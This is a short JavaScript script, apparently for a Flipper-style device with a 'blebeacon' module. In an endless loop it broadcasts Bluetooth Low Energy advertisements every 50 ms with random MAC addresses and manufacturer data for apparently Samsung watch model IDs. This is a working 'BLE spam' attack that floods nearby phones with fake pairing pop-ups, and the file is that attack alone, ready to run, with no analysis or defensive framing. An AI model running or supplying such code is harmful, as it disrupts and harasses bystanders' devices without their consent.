let blebeacon = require("blebeacon");

// Stop if previous background beacon is active
if (blebeacon.isActive()) {
    blebeacon.stop();
}

// Make sure it resets at script exit, true will keep advertising in background
// This is false by default, can be omitted
blebeacon.keepAlive(false);


let math = require("math");

let currentIndex = 0;
let watchValues = [
    0x1A, 0x01, 0x02, 0x03, 0x04, 0x05, 0x06, 0x07, 0x08,
    0x09, 0x0A, 0x0B, 0x0C, 0x11, 0x12, 0x13, 0x14, 0x15,
    0x16, 0x17, 0x18, 0xE4, 0xE5, 0x1B, 0x1C, 0x1D, 0x1E,
    0x20, 0xEC, 0xEF
];

function generateRandomMac() {
    let mac = [];
    for (let i = 0; i < 6; i++) {
        mac.push(math.floor(math.random() * 256));
    }
    return Uint8Array(mac);
}

function sendRandomModelAdvertisement() {
    let model = watchValues[currentIndex];

    let packet = [
        14, 0xFF, 0x75, 0x00, 0x01, 0x00, 0x02, 0x00, 0x01, 0x01, 0xFF, 0x00, 0x00, 0x43,
        model
    ];

    let intervalMs = 50;

    // Power level, min interval and max interval are optional
    blebeacon.setConfig(generateRandomMac(), 0x1F, intervalMs, intervalMs * 3);

    blebeacon.setData(Uint8Array(packet));

    blebeacon.start();

    print("Sent data for model ID " + to_string(model));

    currentIndex = (currentIndex + 1) % watchValues.length;

    delay(intervalMs);

    blebeacon.stop();
}

while (true) {
    sendRandomModelAdvertisement();
}